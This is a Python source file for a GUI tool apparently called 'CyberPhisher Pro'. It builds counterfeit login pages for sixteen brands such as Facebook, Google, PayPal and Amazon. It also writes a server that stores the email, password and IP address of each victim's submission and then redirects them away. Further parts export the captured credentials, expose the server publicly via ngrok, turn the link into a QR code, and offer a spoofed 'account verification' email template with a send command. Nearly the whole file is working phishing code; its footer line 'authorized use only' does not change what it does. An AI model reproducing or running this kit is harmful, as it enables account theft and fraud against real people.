import tkinter as tk
from tkinter import messagebox
import threading, os, random, json, base64
from datetime import datetime

class CyberPhisher:
    def __init__(self, parent, db, logger):
        self.parent = parent; self.db = db; self.logger = logger
        self.frame = tk.Frame(parent, bg='#1a1a2e')

    def build(self):
        self.frame.pack(fill='both', expand=True)
        header = tk.Frame(self.frame, bg='#1a1a2e'); header.pack(fill='x', padx=10, pady=5)
        tk.Label(header, text="CyberPhisher Pro", font=('Courier',16,'bold'), fg='#ff0000', bg='#1a1a2e').pack(side='left')
        tk.Label(header, text="Built-in | No GitHub", font=('Courier',9,'bold'), fg='#00ff88', bg='#1a1a2e').pack(side='right')

        canvas = tk.Canvas(self.frame, bg='#1a1a2e', highlightthickness=0)
        vs = tk.Scrollbar(self.frame, orient='vertical', command=canvas.yview)
        hs = tk.Scrollbar(self.frame, orient='horizontal', command=canvas.xview)
        inner = tk.Frame(canvas, bg='#1a1a2e')
        inner.bind('<Configure>', lambda e: canvas.configure(scrollregion=canvas.bbox('all')))
        canvas.create_window((0,0), window=inner, anchor='nw')
        canvas.configure(yscrollcommand=vs.set, xscrollcommand=hs.set)
        canvas.pack(side='left', fill='both', expand=True)
        vs.pack(side='right', fill='y'); hs.pack(side='bottom', fill='x')
        canvas.bind('<Configure>', lambda e: canvas.itemconfig(1, width=e.width))

        pages = [
            ("Facebook", "#1877f2", "f"), ("Instagram", "#e4405f", "camera"),
            ("Google", "#4285f4", "G"), ("Microsoft", "#00a4ef", "M"),
            ("Twitter", "#1da1f2", "bird"), ("LinkedIn", "#0a66c2", "in"),
            ("GitHub", "#333", "octo"), ("Netflix", "#e50914", "N"),
            ("PayPal", "#003087", "P"), ("Amazon", "#ff9900", "box"),
            ("Dropbox", "#0061ff", "box"), ("Snapchat", "#fffc00", "ghost"),
            ("TikTok", "#000", "music"), ("Spotify", "#1db954", "music"),
            ("Steam", "#00adee", "game"), ("Custom", "#888", "lock"),
        ]
        
        pf = tk.LabelFrame(inner, text=" Login Pages (16) ", font=('Courier',10,'bold'), fg='#ff0000', bg='#16213e', padx=8, pady=5)
        pf.pack(fill='x', padx=10, pady=3)
        for i in range(0, len(pages), 4):
            row = tk.Frame(pf, bg='#16213e'); row.pack(fill='x', pady=1)
            for name, color, icon in pages[i:i+4]:
                tk.Button(row, text=name, font=('Courier',9), fg='#fff', bg=color, relief='flat', padx=8, pady=4,
                        command=lambda n=name,c=color,i=icon: self._gen_page(n,c,i)).pack(side='left', padx=2, expand=True, fill='x')

        sf = tk.LabelFrame(inner, text=" Server & Tools ", font=('Courier',10,'bold'), fg='#00ff88', bg='#16213e', padx=8, pady=5)
        sf.pack(fill='x', padx=10, pady=3)
        srow = tk.Frame(sf, bg='#16213e'); srow.pack(fill='x')
        tk.Button(srow, text="Start Server", font=('Courier',9), fg='#fff', bg='#00ff88', relief='flat', padx=10, pady=5, command=self._start_server).pack(side='left', padx=2)
        tk.Button(srow, text="View Creds", font=('Courier',9), fg='#fff', bg='#ff4444', relief='flat', padx=10, pady=5, command=self._view_creds).pack(side='left', padx=2)
        tk.Button(srow, text="Export Creds", font=('Courier',9), fg='#fff', bg='#ffaa00', relief='flat', padx=10, pady=5, command=self._export_creds).pack(side='left', padx=2)
        tk.Button(srow, text="Clear Creds", font=('Courier',9), fg='#fff', bg='#cc0000', relief='flat', padx=10, pady=5, command=self._clear_creds).pack(side='left', padx=2)

        qf = tk.LabelFrame(inner, text=" QR & Email ", font=('Courier',10,'bold'), fg='#d2991d', bg='#16213e', padx=8, pady=5)
        qf.pack(fill='x', padx=10, pady=3)
        qrow = tk.Frame(qf, bg='#16213e'); qrow.pack(fill='x')
        tk.Button(qrow, text="QR Code", font=('Courier',9), fg='#fff', bg='#d2991d', relief='flat', padx=10, pady=5, command=self._qr_gen).pack(side='left', padx=2)
        tk.Button(qrow, text="Email Spoof", font=('Courier',9), fg='#fff', bg='#ffaa00', relief='flat', padx=10, pady=5, command=self._spoof_email).pack(side='left', padx=2)

        self.output = tk.Text(inner, font=('Courier',9), bg='#0a0a0a', fg='#00ff88', relief='flat', height=8)
        self.output.pack(fill='both', expand=True, padx=10, pady=5)
        self.status = tk.Label(inner, text="Ready | 16 templates | No GitHub needed", font=('Courier',8), fg='#888', bg='#1a1a2e')
        self.status.pack(anchor='w', padx=10)

    def _gen_page(self, name, color, icon):
        html = '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>' + name + ' - Log In</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f0f2f5;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}.c{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);width:100%;max-width:400px;text-align:center}.l{font-size:48px;color:' + color + ';margin-bottom:10px}h1{color:' + color + ';margin-bottom:5px;font-size:24px}p{color:#606770;margin-bottom:20px;font-size:14px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px}input:focus{outline:none;border-color:' + color + '}.btn{width:100%;padding:12px;background:' + color + ';color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px}.btn:hover{opacity:.9}.ft{margin-top:20px;color:#606770;font-size:12px}</style></head><body><div class="c"><div class="l">' + icon + '</div><h1>' + name + '</h1><p>Log in to your account</p><form method="POST" action="/capture"><input type="email" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Log In</button></form><div class="ft">Security test - authorized use only</div></div></body></html>'
        
        d = os.path.expanduser("~/phishing_pages")
        os.makedirs(d, exist_ok=True)
        path = os.path.join(d, name.lower() + "_login.html")
        with open(path, 'w') as f: f.write(html)
        
        server_py = 'import http.server, urllib.parse, os, json\nfrom datetime import datetime\nF=os.path.expanduser("~/phishing_pages/captured_creds.json")\nclass H(http.server.SimpleHTTPRequestHandler):\n def do_POST(s):\n  b=s.rfile.read(int(s.headers.get("Content-Length",0))).decode()\n  d=dict(urllib.parse.parse_qsl(b));d["time"]=str(datetime.now());d["ip"]=s.client_address[0]\n  c=[]\n  if os.path.exists(F):c=json.load(open(F))\n  c.append(d);json.dump(c,open(F,"w"),indent=2)\n  s.send_response(302);s.send_header("Location","https://google.com");s.end_headers()\n  print("Captured:",d.get("email"))\n def do_GET(s):\n  if s.path=="/":s.path="/index.html"\n  return http.server.SimpleHTTPRequestHandler.do_GET(s)\nos.chdir(os.path.expanduser("~/phishing_pages"))\nhttpd=http.server.HTTPServer(("0.0.0.0",8080),H)\nprint("Server on :8080")\nhttpd.serve_forever()'
        with open(os.path.join(d, 'server.py'), 'w') as f: f.write(server_py)
        
        self.output.insert('end', '\n[+] Generated ' + name + ' login page\n')
        self.output.insert('end', '    Run: cd ~/phishing_pages && python3 server.py\n')
        self.output.insert('end', '    Target URL: http://YOUR_IP:8080\n')
        self.output.see('end')
        self.status.config(text='Generated ' + name + ' page | Start server to capture')

    def _start_server(self):
        d = os.path.expanduser("~/phishing_pages")
        os.makedirs(d, exist_ok=True)
        self.output.insert('end', '\n[*] To start capture server:\n')
        self.output.insert('end', '    cd ~/phishing_pages && python3 server.py\n')
        self.output.insert('end', '[*] For public access use ngrok:\n')
        self.output.insert('end', '    ngrok http 8080\n')
        self.output.see('end')

    def _view_creds(self):
        cf = os.path.expanduser("~/phishing_pages/captured_creds.json")
        if os.path.exists(cf):
            creds = json.load(open(cf))
            d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title("Captured Credentials"); d.geometry("500x400")
            tk.Label(d, text="Captured (" + str(len(creds)) + ")", font=('Courier',12,'bold'), fg='#ff0000', bg='#1a1a2e').pack(pady=5)
            t = tk.Text(d, font=('Courier',9), bg='#0a0a0a', fg='#00ff88', relief='flat')
            t.pack(fill='both', expand=True, padx=5, pady=5)
            for c in creds[-50:]:
                t.insert('end', c.get('email','?') + ' | ' + c.get('password','?') + ' | ' + c.get('ip','?') + '\n')
            t.config(state='disabled')
            tk.Button(d, text="Close", font=('Courier',10), fg='#fff', bg='#666', command=d.destroy).pack(pady=5)
        else:
            messagebox.showinfo("No Data", "No credentials captured yet")

    def _export_creds(self):
        cf = os.path.expanduser("~/phishing_pages/captured_creds.json")
        if os.path.exists(cf):
            import shutil
            p = os.path.expanduser("~/creds_export_" + str(random.randint(1000,9999)) + ".json")
            shutil.copy(cf, p)
            messagebox.showinfo("Exported", "Saved to " + p)

    def _clear_creds(self):
        cf = os.path.expanduser("~/phishing_pages/captured_creds.json")
        if os.path.exists(cf) and messagebox.askyesno("Clear", "Delete all captured credentials?"):
            os.remove(cf)
            messagebox.showinfo("Cleared", "Credentials deleted")

    def _qr_gen(self):
        self.output.insert('end', '\n[*] QR Code Generator:\n')
        self.output.insert('end', '    qrencode -o qr.png "http://YOUR_IP:8080"\n')
        self.output.insert('end', '    Install: pkg install qrencode\n')
        self.output.see('end')

    def _spoof_email(self):
        self.output.insert('end', '\n[*] Email Spoof Template:\n')
        self.output.insert('end', 'From: security@company.com\n')
        self.output.insert('end', 'To: target@email.com\n')
        self.output.insert('end', 'Subject: Urgent: Account Verification\n\n')
        self.output.insert('end', 'Click here to verify: http://YOUR_IP:8080\n')
        self.output.insert('end', '\nSend via: swaks --to target --from spoof --server smtp.gmail.com:587\n')
        self.output.see('end')
